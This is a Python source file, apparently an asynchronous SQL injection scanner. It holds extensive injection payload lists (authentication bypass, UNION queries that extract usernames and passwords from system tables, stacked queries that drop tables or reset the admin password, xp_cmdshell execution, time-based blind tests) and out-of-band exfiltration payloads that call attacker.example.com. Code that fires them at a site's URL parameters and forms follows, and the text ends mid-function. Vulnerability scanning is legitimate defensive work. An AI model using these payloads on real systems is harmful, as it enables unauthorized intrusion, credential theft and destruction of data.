import asyncio
import aiohttp
import random
import string
import time
import uuid
import re
from typing import List, Dict, Any, Optional
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Optional ML components - will gracefully degrade if not available
try:
    from sklearn.linear_model import LogisticRegression
    import numpy as np
    ML_AVAILABLE = True
except ImportError:
    ML_AVAILABLE = False
    print("Warning: scikit-learn or numpy not available, ML detection disabled")

class EnhancedSQLScanner:
    """
    Enhanced scanner for detecting SQL injection vulnerabilities with advanced techniques.
    """

    def __init__(self):
        # SQL error patterns
        self.sql_error_patterns = [
            # MySQL
            r"SQL syntax.*?MySQL", r"Warning.*?mysqli?", r"MySQLSyntaxErrorException",
            r"valid MySQL result", r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"MySQL Query fail.*", r"SQL syntax.*", r"Access denied for user.*",
            r"you have an error in your sql syntax", r"supplied argument is not a valid MySQL",
            
            # Oracle
            r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*oci_.*",
            r"quoted string not properly terminated", r"SQL command not properly ended",
            r"PLS-[0-9][0-9][0-9][0-9]", r"TNS:[a-z0-9_-]+",
            
            # Microsoft SQL Server
            r"Microsoft SQL Server", r"ODBC SQL Server Driver", r"ODBC Driver \d+ for SQL Server",
            r"SQLServer JDBC Driver", r"Unclosed quotation mark after the character string",
            r"Microsoft OLE DB Provider for ODBC Drivers error", r"SQL Server[^&]*Driver",
            r"Warning.*mssql_.*", r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine",
            r"\bODBC\b.*\bSQL\b.*\bServer\b", r"Incorrect syntax near", r"Syntax error in string in query expression",
            r"Procedure or function .+ expects parameter", r"Unclosed quotation mark before the character string",
            r"Syntax error \(missing operator\) in query expression",
            
            # PostgreSQL
            r"PostgreSQL.*ERROR", r"Warning.*pg_.*", r"valid PostgreSQL result", r"Npgsql\.",
            r"PG::SyntaxError:", r"org\.postgresql\.util\.PSQLException", r"ERROR:\s+syntax error at or near",
            r"ERROR: parser: parse error at or near", r"ERROR: unterminated quoted string at or near",
            r"invalid input syntax for (?:type|integer)", r"relation \"[^\"]*\" does not exist",
            
            # Generic SQL
            r"SQLSTATE[", r"SQLSTATE=", r"Incorrect syntax near", r"Syntax error near",
            r"Unclosed quotation mark \(before\|after\)", r"error in your SQL syntax", r"unexpected end of SQL command",
            r"WARNING: SQL", r"ERROR: unterminated quoted", r"SQL command not properly ended",
            r"DatabaseDriverException", r"DBD::mysql::st execute failed:", r"Database error",
            r"column \"[^\"]*\" does not exist", r"no such column", r"supplied argument is not a valid",
            
            # SQLite
            r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"SQLITE_ERROR", r"\[SQLITE_ERROR\]",
            r"near \"[^\"]*\": syntax error", r"unable to open database file",
            
            # IBM DB2
            r"DB2 SQL error", r"db2_\w+\(", r"SQLSTATE", r"CLI Driver.*DB2", r"DB2.*SQL error", r"SQLCODE",
            r"DB2 SQL error: SQLCODE:", r"com.ibm.db2.jcc", r"Driver \d+.{0,10}? IBM DB2",
            
            # Sybase
            r"Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message", r"SybSQLException",
            r"Sybase.Data.AseClient", r"Adaptive Server Enterprise",
            
            # Ingres
            r"Warning.*ingres_", r"Ingres SQLSTATE", r"Ingres\W.*Driver",
            
            # Informix
            r"Exception.*Informix", r"INFORMIX_", r"com.informix.jdbc",
            
            # Firebird
            r"Dynamic SQL Error", r"Warning.*ibase_.*",
            
            # Hibernate
            r"org\.hibernate\.QueryException", 
            
            # JDBC
            r"java\.sql\.SQLException", r"java\.sql\.SQLSyntaxErrorException",
            
            # Other common patterns
            r"Unknown column '[^']+' in 'field list'", r"Table '[^']+' doesn't exist",
            r"You have an error in your SQL syntax", r"Division by zero in query expression",
            r"Data truncated for column", r"Duplicate entry '[^']+' for key", 
            r"Can't find record in", r"Unable to execute query", r"Subquery returns more than 1 row"
        ]
        
        # Advanced payloads
        self.error_payloads = [
            # Basic authentication bypass
            "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1 --", "\" OR 1=1 --",
            "' OR 1 --", "\" OR 1 --", "') OR ('1'='1", "\") OR (\"1\"=\"1",
            "' OR '1'='1' --", "\" OR \"1\"=\"1' --",
            "' OR 1=1 #", "\" OR 1=1 #", "' OR 1=1 /*", "\" OR 1=1 /*",
            "admin'--", "admin' #", "admin'/*", "admin' OR 1=1--", "admin\" OR 1=1--",
            "admin' OR '1'='1", "admin') OR ('1'='1", "1' OR '1' = '1", "1' OR '1' = '1' --",
            
            # UNION-based payloads
            "' UNION SELECT 1,2,3 --", "\" UNION SELECT 1,2,3 --",
            "' UNION SELECT 1,2,3,4 --", "\" UNION SELECT 1,2,3,4 --",
            "' UNION SELECT 1,2,3,4,5 --", "\" UNION SELECT 1,2,3,4,5 --",
            "' UNION SELECT NULL,NULL,NULL --", "\" UNION SELECT NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL --", "\" UNION SELECT NULL,NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL --", "\" UNION SELECT NULL,NULL,NULL,NULL,NULL --",
            "' UNION ALL SELECT 1,2,3 --", "\" UNION ALL SELECT 1,2,3 --",
            
            # Database fingerprinting
            "' UNION SELECT @@version,2,3 --", "\" UNION SELECT @@version,2,3 --",
            "' UNION SELECT version(),2,3 --", "\" UNION SELECT version(),2,3 --",
            "' AND SUBSTRING((SELECT @@version),1,1)='M' --",
            
            # Database content extraction
            "' UNION SELECT table_name,2,3 FROM information_schema.tables --",
            "' UNION SELECT column_name,2,3 FROM information_schema.columns --",
            "' UNION SELECT username,password,3 FROM users --",
            "' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns --",
            "' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table' --",
            "' UNION SELECT NULL, NULL, concat(table_name) FROM information_schema.tables --",
            
            # Error-based payloads
            "' AND (SELECT 6765 FROM (SELECT(SLEEP(0.1)))OQT) AND 'nnoF'='nnoF",
            "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,0x27,BENCHMARK(25000000,MD5(1)),0x27,0x7e))s), 8, 8))) --",
            "' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1 --",
            "' AND (SELECT 2*(IF((SELECT * FROM users LIMIT 1)=1, BENCHMARK(10000000,MD5('A')), 8))) --",
            "' AND extractvalue(rand(),concat(0x7e,(SELECT version()),0x7e)) --",
            "' AND updatexml(rand(),concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e),1) --",
            
            # Stacked queries - multiple statements
            "'; DROP TABLE users; --", "'; SELECT * FROM users; --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
            "'; EXEC xp_cmdshell('cmd.exe /c echo vulnerable'); --",
            "'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'; --",
            
            # SQLMap specific payloads
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) --",
            "' AND SLEEP(5) AND 'vRxe'='vRxe",
            "' AND 5174=(SELECT 5174 FROM PG_SLEEP(5)) --",
            "' WAITFOR DELAY '0:0:5' --",
            "')) OR SLEEP(5)='",
            "')) OR 5174=(SELECT 5174 FROM PG_SLEEP(5))='",
            "')) OR BENCHMARK(10000000,MD5(0x41))='",
            
            # Boolean-based blind payloads
            "' AND 1=1 --", "' AND 1=2 --",
            "' AND (SELECT 1) --", "' AND (SELECT 0) --",
            "\" AND (SELECT 1)=\"", "\" AND (SELECT 0)=\"",
            "' OR EXISTS(SELECT 1 FROM users) --", "' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --",
            "' OR (SELECT 'x' FROM users WHERE username='admin' AND LENGTH(password)>5) --",
            "' OR (SELECT 'x' FROM users WHERE SUBSTR(username,1,1)='a') --",
            "' AND SUBSTR(version(),1,1)='5' --", "' OR ORD(SUBSTR(version(),1,1))>51 --",
            
            # URL-encoded payloads
            "%27%20OR%20%271%27%3D%271%27%20--",  # URL-encoded ' OR '1'='1' --
            "%27%20UNION%20SELECT%20NULL%2CNULL%2Cconcat%28username%2C%27%7C%27%2Cpassword%29%20FROM%20users%20--",
            
            # Different comment styles
            "' OR '1'='1' -- comment", "' OR '1'='1'#", "' OR '1'='1'/*", "' OR '1'='1';--",
            
            # Special character bypassing
            "' OR 1=1 %00", "' OR 1/**/=/**/1", "' OR/**/1=1", "' /*!50000OR*/ '1'='1'",
            "\"+OR+1=1--", "'+OR+'1'='1", "`OR 1=1 --", "') OR 1=1 --",
            
            # Output testing payloads
            "' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --",
            "' UNION SELECT ALL 'SQLi' --",
            "' UNION SELECT 'SQLi',NULL --",
            "' UNION SELECT 'SQLi1','SQLi2' --",
            "' UNION SELECT 'SQLi',(SELECT version()) --",
            
            # Case sensitivity bypass
            "' OR 'a'='A' --", "' UnIoN SeLeCt 1,2,3 --",
            
            # Exotic payloads
            "' OR '1' || '1' = '11", "' OR 'sqlite' LIKE 'sql%", 
            "' OR username IS NOT NULL --", "\" OR \"x\"=\"x",
            "') OR ('x')=('x", "')) OR (('x'))=(('x", "\")) OR ((\"x\"))=((\"x",
            "')) OR 1=1--", ";SELECT * FROM users", 
            "/*!50000 OR 1=1*/",
            "' OR JSON_EXTRACT('[1]', '$[0]') = 1 --"
        ]
        
        self.blind_payloads = [
            # MySQL sleep payloads 
            "' AND SLEEP(3) --", "\" AND SLEEP(3) --",
            "' OR SLEEP(3) --", "\" OR SLEEP(3) --",
            "' AND (SELECT * FROM (SELECT(SLEEP(3)))a) --",
            "\" AND (SELECT * FROM (SELECT(SLEEP(3)))a) --",
            "1) AND SLEEP(3) --",
            "1)) AND SLEEP(3) --",
            "1' AND SLEEP(3) AND '1'='1",
            "' AND SLEEP(3) AND 'QTc'='QTc",
            "' AND SLEEP(3) OR 'a'='a",
            "\" AND SLEEP(3) OR \"a\"=\"a",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 10 AND SLEEP(3) --",
            
            # PostgreSQL sleep payloads
            "' AND pg_sleep(3) --", "\" AND pg_sleep(3) --",
            "' OR pg_sleep(3) --", "\" OR pg_sleep(3) --",
            "' AND 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "\" AND 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "' OR 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "\" OR 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "' AND (SELECT pg_sleep(3)) IS NOT NULL --",
            "' AND CASE WHEN (username='admin') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users --",
            
            # SQL Server payloads
            "' AND WAITFOR DELAY '0:0:3' --",
            "\" AND WAITFOR DELAY '0:0:3' --",
            "' OR WAITFOR DELAY '0:0:3' --",
            "\" OR WAITFOR DELAY '0:0:3' --",
            "1); WAITFOR DELAY '0:0:3' --",
            "1)); WAITFOR DELAY '0:0:3' --",
            "1'; WAITFOR DELAY '0:0:3' --",
            "' AND IF(version() LIKE '5%', WAITFOR DELAY '0:0:3', 'false') --",
            "'; WAITFOR DELAY '0:0:3' --",
            "'; BEGIN WAITFOR DELAY '0:0:3' END --",
            
            # Oracle payloads
            "' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "\" AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "' OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "\" OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) ELSE NULL END FROM DUAL) IS NOT NULL --",
            
            # SQLite payloads
            "' AND RANDOMBLOB(500000000) AND '1'='1",
            "\" AND RANDOMBLOB(500000000) AND \"1\"=\"1",
            "' OR RANDOMBLOB(500000000) AND '1'='1",
            "\" OR RANDOMBLOB(500000000) AND \"1\"=\"1",
            "' AND IIF(2>1,RANDOMBLOB(500000000),1) --",
            
            # Generic heavy queries payloads
            "' AND (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "\" AND (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "' OR (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "\" OR (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "' AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) > 0 --",
            "' AND (WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n < 1000000) SELECT count(*) FROM t) > 0 --",
            
            # Boolean-based blind injection payloads (True condition)
            "' AND 1=1 --", "\" AND 1=1 --", "' OR 1=1 --", "\" OR 1=1 --",
            "' AND '1'='1", "\" AND \"1\"=\"1", "' OR '1'='1", "\" OR \"1\"=\"1",
            "' AND 3>2 --", "\" AND 3>2 --", "' OR 3>2 --", "\" OR 3>2 --",
            
            # Boolean-based blind injection payloads (False condition)
            "' AND 1=2 --", "\" AND 1=2 --", "' OR 1=2 --", "\" OR 1=2 --",
            "' AND '1'='2", "\" AND \"1\"=\"2", "' OR '1'='2", "\" OR \"1\"=\"2",
            "' AND 3<2 --", "\" AND 3<2 --", "' OR 3<2 --", "\" OR 3<2 --"
        ]
        
        # Database user enumeration payloads
        self.user_enum_payloads = [
            # MySQL
            "' UNION SELECT user(),2,3 --",
            "' UNION SELECT current_user(),2,3 --",
            "' UNION SELECT system_user(),2,3 --",
            "' UNION SELECT user,password,3 FROM mysql.user --",
            
            # PostgreSQL
            "' UNION SELECT current_user,session_user,3 --",
            "' UNION SELECT usename,passwd,3 FROM pg_shadow --",
            
            # MSSQL
            "' UNION SELECT SYSTEM_USER,USER_NAME(),3 --",
            "' UNION SELECT user_name(),2,3 --",
            "' UNION SELECT loginame,name,3 FROM master..syslogins --",
            
            # Oracle
            "' UNION SELECT username,password,3 FROM all_users --",
            "' UNION SELECT SYS.LOGIN_USER,SYS.DATABASE_NAME,3 FROM DUAL --",
            
            # SQLite
            "' UNION SELECT sqlite_version(),2,3 --"
        ]
        
        # Database schema enumeration payloads
        self.schema_enum_payloads = [
            # MySQL
            "' UNION SELECT table_name,table_schema,3 FROM information_schema.tables --",
            "' UNION SELECT column_name,table_name,3 FROM information_schema.columns --",
            "' UNION SELECT CONCAT(table_schema,'.',table_name),2,3 FROM information_schema.tables --",
            
            # PostgreSQL
            "' UNION SELECT table_name,table_catalog,3 FROM information_schema.tables --",
            "' UNION SELECT column_name,table_name,3 FROM information_schema.columns --",
            
            # MSSQL
            "' UNION SELECT name,2,3 FROM sysobjects WHERE xtype='U' --",
            "' UNION SELECT name,object_id,3 FROM sys.tables --",
            "' UNION SELECT name,2,3 FROM syscolumns --",
            
            # Oracle
            "' UNION SELECT table_name,owner,3 FROM all_tables --",
            "' UNION SELECT column_name,table_name,3 FROM all_tab_columns --",
            
            # SQLite
            "' UNION SELECT name,sql,3 FROM sqlite_master WHERE type='table' --",
            "' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table' --"
        ]
        
        # Out-of-band exfiltration payloads (DNS/HTTP)
        self.oob_payloads = [
            # These would require a callback server in a real attack
            "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.example.com\\\\share\\\\file')) --",
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.example.com\\\\share\\\\file')),2,3 --",
            "'; exec master..xp_dirtree '\\\\attacker.example.com\\share\\'; --"
        ]
        
        # Likely vulnerable parameters
        self.likely_params = [
            # Common ID parameters
            "id", "user_id", "item_id", "product_id", "cat_id", "category_id", "cid", "pid", "sid", 
            "uid", "userid", "usr_id", "use_id", "member_id", "membership_id", "mid", "num", "number",
            "order_id", "payment_id", "pmt_id", "purchase_id", 
            
            # Content-related parameters
            "page_id", "article_id", "post_id", "story_id", "thread_id", "topic_id", "blog_id", "feed_id",
            "forum_id", "rel_id", "relation_id", "p", "pg", "record", "row", "event_id", "message_id",
            
            # Common identifiers
            "cat", "category", "user", "username", "email", "name", "handle", "login", "account", 
            "article", "news", "item", "product", "post", "date", "month", "year", "type", "tab", 
            
            # Search/query parameters
            "query", "search", "q", "s", "term", "keyword", "keywords", "filter", "sort", "sortby",
            "order", "orderby", "dir", "direction", "lang", "language", "reference", "ref", 
            
            # Action parameters
            "do", "action", "act", "cmd", "command", "func", "function", "op", "option", "process",
            "step", "mode", "stat", "status", "state", "stage", "phase", "redirect", "redir", "url", "link", 
            "goto", "target", "destination", "return", "returnurl", "return_url", "checkout", "continue", 
            
            # Path parameters
            "path", "folder", "directory", "prefix", "file", "filename", "pathname", "source", "dest",
            "destination", "base_url", "base", "parent", "child", "start", "end", "root", "origin",
            
            # Database parameters
            "db", "database", "table", "column", "field", "key", "record", "value", "row", "select",
            "where", "find", "delete", "update", "from", "to", "like", "limit", "offset", "fields",
            
            # Auth parameters
            "auth", "token", "jwt", "sess", "session", "cookie", "api_key", "apikey", "app_id", "appid",
            "auth_token", "access_token", "oauth", "code", "nonce", "timestamp", "expire", "valid",
            
            # Login-related parameters
            "pwd", "password", "passwd", "pass", "credentials", "auth", "login", "uname", "user",
            "secret", "pin"
        ]
        
        # Initialize ML model if available
        if ML_AVAILABLE:
            self.ml_model = LogisticRegression()
            # Train with simple dummy data (would be replaced with real data in production)
            self.ml_model.fit(
                np.array([[0.1, 200, 0], [3.0, 500, 1], [0.2, 300, 0], [2.5, 400, 1]]),
                np.array([0, 1, 0, 1])  # 0 = normal, 1 = vulnerable
            )
        else:
            self.ml_model = None
        
        self.max_concurrent_requests = 10
        self.baseline_cache = {}  # Cache baseline responses
        
    async def scan_url(self, url: str) -> List[Dict[str, Any]]:
        """
        Scan a URL for SQL injection vulnerabilities using multiple techniques.
        
        Args:
            url: The URL to scan
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        print(f"Scanning {url} for SQL injection vulnerabilities...")
        
        try:
            semaphore = asyncio.Semaphore(self.max_concurrent_requests)
            
            # Try to fingerprint the database type
            db_type = await self._fingerprint_db(url, semaphore)
            if db_type != "unknown":
                print(f"Detected database: {db_type}")
                self.db_type = db_type  # Store DB type as an instance variable
                
                # Customize payloads based on DB type
                if db_type == "mysql":
                    self.error_payloads.append("' OR @@version LIKE '%MariaDB%' --")
                elif db_type == "postgres":
                    self.blind_payloads.append("' AND 1=pg_sleep(3) --")
                elif db_type == "mssql":
                    self.blind_payloads.append("' OR WAITFOR DELAY '0:0:3' --")
            
            # Multi-stage testing for the main URL
            tasks = [
                self._check_url_parameters(url, semaphore),
                self._check_forms(url, semaphore),
                self._check_headers(url, semaphore),
                self._check_cookies(url, semaphore)
            ]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, list):
                    vulnerabilities.extend(result)
            
            # Generate additional test URLs based on the main URL
            additional_urls = await self._generate_test_urls(url, semaphore)
            
            # Test known vulnerable paths based on the main domain
            known_vulnerable_paths = await self._test_known_vulnerable_paths(url, semaphore)
            if known_vulnerable_paths:
                vulnerabilities.extend(known_vulnerable_paths)
            
            # Test additional generated URLs
            for test_url in additional_urls:
                print(f"Testing additional URL: {test_url}")
                test_results = await self._check_url_parameters(test_url, semaphore)
                if test_results:
                    vulnerabilities.extend(test_results)
            
            # Adjust concurrency based on response time
            if url in self.baseline_cache:
                baseline_avg = self.baseline_cache[url]["time"]
                self.max_concurrent_requests = min(50, max(5, int(10 / baseline_avg)))
        
        except Exception as e:
            print(f"Error scanning for SQL injection: {str(e)}")
        
        # Consolidate duplicate vulnerabilities before returning
        consolidated_vulnerabilities = self._consolidate_vulnerabilities(vulnerabilities)
        return consolidated_vulnerabilities
        
    def _consolidate_vulnerabilities(self, vulnerabilities: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Consolidate duplicate SQL injection vulnerabilities.
        
        This method groups vulnerabilities by location and parameter, so that multiple
        successful injection attempts on the same parameter are merged into a single
        vulnerability entry with multiple payloads listed.
        
        Args:
            vulnerabilities: The list of vulnerabilities to consolidate
            
        Returns:
            A list of consolidated vulnerabilities
        """
        if not vulnerabilities:
            return []
            
        # Create a dictionary to group vulnerabilities by their location and affected parameter
        consolidated = {}
        
        for vuln in vulnerabilities:
            # Extract the key information to identify unique vulnerabilities
            location = vuln.get("location", "")
            param_name = ""
            
            # Extract parameter name from evidence or description
            evidence = vuln.get("evidence", "")
            description = vuln.get("description", "")
            
            # Try to extract parameter name from evidence
            param_match = re.search(r"Parameter '([^']+)'", evidence)
            if param_match:
                param_name = param_match.group(1)
            else:
                # Try to extract from description
                desc_match = re.search(r"parameter: ([^\s,]+)", description)
                if desc_match:
                    param_name = desc_match.group(1)
            
            # Create a unique key for this vulnerability type
            key = f"{location}:{param_name}"
            
            # Get the payload from the evidence
            payload = ""
            payload_match = re.search(r"payload '([^']+)'", evidence)
            if payload_match:
                payload = payload_match.group(1)
            
            if key not in consolidated:
                # Create a new entry with this vulnerability as the base
                consolidated[key] = vuln.copy()
                consolidated[key]["payloads"] = [payload] if payload else []
                # Set a single, consistent ID
                consolidated[key]["id"] = str(uuid.uuid4())
            else:
                # Update the existing entry
                if payload and payload not in consolidated[key]["payloads"]:
                    consolidated[key]["payloads"].append(payload)
                
                # Update the evidence to show multiple payloads were successful
                current_evidence = consolidated[key].get("evidence", "")
                if not current_evidence.startswith("Multiple payloads"):
                    consolidated[key]["evidence"] = f"Multiple payloads were successful. Examples: {consolidated[key]['evidence']}"
                
                # If severity levels differ, keep the highest one
                severity_levels = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
                current_severity = consolidated[key].get("severity", "info")
                new_severity = vuln.get("severity", "info")
                
                if severity_levels.get(new_severity, 0) > severity_levels.get(current_severity, 0):
                    consolidated[key]["severity"] = new_severity
        
        # Convert dictionary values back to a list
        result = list(consolidated.values())
        
        # Update evidence with payload information if available
        for vuln in result:
            if vuln.get("payloads") and len(vuln["payloads"]) > 1:
                # Only show first 5 payloads to avoid excessive output
                payload_examples = ", ".join([f"'{p}'" for p in vuln["payloads"][:5]])
                additional = f" ({len(vuln['payloads']) - 5} more)" if len(vuln["payloads"]) > 5 else ""
                vuln["evidence"] = f"Multiple successful payloads: {payload_examples}{additional}"
            
            # Clean up the temporary payloads field that we used for consolidation
            if "payloads" in vuln:
                del vuln["payloads"]
        
        print(f"Consolidated {len(vulnerabilities)} vulnerabilities into {len(result)} unique findings")
        return result
    
    async def _fingerprint_db(self, url: str, semaphore: asyncio.Semaphore) -> str:
        """
        Fingerprint the database type by testing specific payloads.
        
        Args:
            url: The URL to test
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            The detected database type or "unknown"
        """
        fingerprint_payloads = {
            "mysql": "' UNION SELECT NULL, @@version, NULL --",
            "postgres": "' UNION SELECT NULL, version(), NULL --",
            "mssql": "' UNION SELECT NULL, @@version, NULL --",
            "sqlite": "' UNION SELECT NULL, sqlite_version(), NULL --",
            "oracle": "' UNION SELECT NULL, banner, NULL FROM v$version --"
        }
        
        # Parse the URL to find parameters to inject
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # If no parameters, try to find ID patterns in path
        param_name = None
        if not query_params:
            path_segments = parsed_url.path.split('/')
            for i, segment in enumerate(path_segments):
                if segment.isdigit() or (segment and segment[-1].isdigit()):
                    param_name = f"path_id_{i}"
                    break
        else:
            # Use the first parameter found
            param_name = next(iter(query_params))
        
        if not param_name:
            return "unknown"
        
        async with semaphore:
            async with aiohttp.ClientSession() as session:
                for db_type, payload in fingerprint_payloads.items():
                    try:
                        # Inject the fingerprinting payload
                        if param_name.startswith("path_id_"):
                            # For path-based parameters, we need a different approach
                            continue
                        
                        # For query parameters, use the standard injection
                        new_url = self._inject_payload(url, param_name, payload)
                        async with session.get(new_url, timeout=10, ssl=False) as response:
                            text = await response.text()
                            
                            # Check for database signatures in response
                            if db_type == "mysql" and ("mysql" in text.lower() or "mariadb" in text.lower()):
                                return "mysql"
                            elif db_type == "postgres" and "postgresql" in text.lower():
                                return "postgres"
                            elif db_type == "mssql" and ("microsoft" in text.lower() and "sql server" in text.lower()):
                                return "mssql"
                            elif db_type == "sqlite" and "sqlite" in text.lower():
                                return "sqlite"
                            elif db_type == "oracle" and "oracle" in text.lower():
                                return "oracle"
                    except Exception as e:
                        continue
        
        return "unknown"
    
    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """
        Inject a payload into a URL parameter.
        
        Args:
            url: The URL to inject into
            param_name: The parameter name to inject into
            payload: The payload to inject
            
        Returns:
            The new URL with the injected payload
        """
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Make a copy of the query parameters
        new_params = {k: v.copy() if isinstance(v, list) else [v] for k, v in query_params.items()}
        
        # Modify the target parameter
        if param_name in new_params:
            new_params[param_name] = [payload]
        else:
            new_params[param_name] = [payload]
        
        # Reconstruct the URL
        new_query = urlencode(new_params, doseq=True)
        return urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        )) 
    
    async def _check_url_parameters(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check URL parameters for SQL injection vulnerabilities with improved path-based parameter detection.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # Parse the URL
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            original_url = url
            
            # Handle URL normalization
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
                parsed_url = urlparse(url)
            
            # If there are no query parameters, try to identify path-based parameters
            if not query_params:
                print(f"No query parameters found, checking for path-based parameters in {parsed_url.path}")
                
                # Check for common path patterns like /users/123 or /products/456
                path_parts = parsed_url.path.split('/')
                for i, part in enumerate(path_parts):
                    # Look for numeric IDs
                    if part.isdigit():
                        query_params[f"path_id_{i}"] = [part]
                        print(f"Found potential path-based ID parameter: {part} at position {i}")
                    
                    # Look for SEO-friendly slugs with IDs like 'product-123'
                    elif '-' in part and any(segment.isdigit() for segment in part.split('-')):
                        for segment in part.split('-'):
                            if segment.isdigit():
                                query_params[f"path_slug_id_{i}"] = [segment]
                                print(f"Found potential slug ID parameter: {segment} at position {i}")
                    
                    # Look for pattern where parameter name and value are in consecutive segments
                    # Example: /category/electronics/price/100-200/
                    if i > 0 and i < len(path_parts) - 1:
                        if path_parts[i].lower() in self.likely_params:
                            query_params[path_parts[i]] = [path_parts[i+1]]
                            print(f"Found potential name/value pair in path: {path_parts[i]}={path_parts[i+1]}")
            
            # If there are still no parameters to test, try other discovery methods
            if not query_params:
                print("No parameters found in path, attempting to discover endpoints with parameters")
                
                # Try common endpoints that might have parameters
                common_endpoints = [
                    "/search", "/products", "/users", "/login", "/items", "/category",
                    "/view", "/profile", "/account", "/article", "/news", "/blog", "/post"
                ]
                
                # For each potential endpoint, create a synthetic parameter to test
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                for endpoint in common_endpoints:
                    test_url = f"{base_url}{endpoint}"
                    if test_url != original_url:  # Avoid retesting the original URL
                        test_params = {"id": ["1"], "test": ["1"]}
                        test_query = urlencode(test_params, doseq=True)
                        test_endpoint_url = f"{test_url}?{test_query}"
                        print(f"Testing common endpoint: {test_endpoint_url}")
                        
                        # Make a quick request to check if the endpoint exists
                        try:
                            async with semaphore:
                                async with aiohttp.ClientSession() as session:
                                    async with session.get(test_endpoint_url, timeout=5, ssl=False) as response:
                                        if response.status == 200:
                                            # Endpoint exists, add it to our testing queue
                                            endpoint_url = f"{base_url}{endpoint}"
                                            for param in ["id", "test"]:
                                                query_params[f"discovered_{param}"] = ["1"]
                        except Exception as e:
                            print(f"Error testing endpoint {test_endpoint_url}: {str(e)}")
            
            # If there are still no parameters, return empty list
            if not query_params:
                print("No testable parameters found in URL")
                return []
            
            print(f"Testing {len(query_params)} parameters for SQL injection: {list(query_params.keys())}")
            
            # Create tasks for each parameter
            tasks = []
            for param_name, param_values in query_params.items():
                if not param_values:
                    continue
                    
                param_value = param_values[0] if param_values and param_values[0] else "1"
                
                # Prioritize testing for known vulnerable parameter names
                priority = 1.0
                if any(vulnerable_param in param_name.lower() for vulnerable_param in ["id", "user", "pass", "admin", "login", "key"]):
                    priority = 2.0  # Higher priority for likely vulnerable parameters
                
                # Test for error-based SQL injection
                tasks.append(self._test_error_sqli(url, param_name, param_value, "url", semaphore, priority=priority))
                
                # Test for blind SQL injection (more expensive, so we're selective)
                if random.random() < priority * 0.7:  # Adjust probability based on parameter priority
                    tasks.append(self._test_blind_sqli(url, param_name, param_value, "url", semaphore, priority=priority))
            
            # Run tasks concurrently
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Filter out exceptions and None results
            for result in results:
                if isinstance(result, dict) and result:
                    vulnerabilities.append(result)
        
        except Exception as e:
            print(f"Error checking URL parameters for SQL injection: {str(e)}")
        
        return vulnerabilities
    
    async def _check_forms(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check forms for SQL injection vulnerabilities.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # Fetch the page content
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=10, ssl=False) as response:
                        if response.status != 200:
                            return []
                        
                        html_content = await response.text()
            
            # Parse the HTML
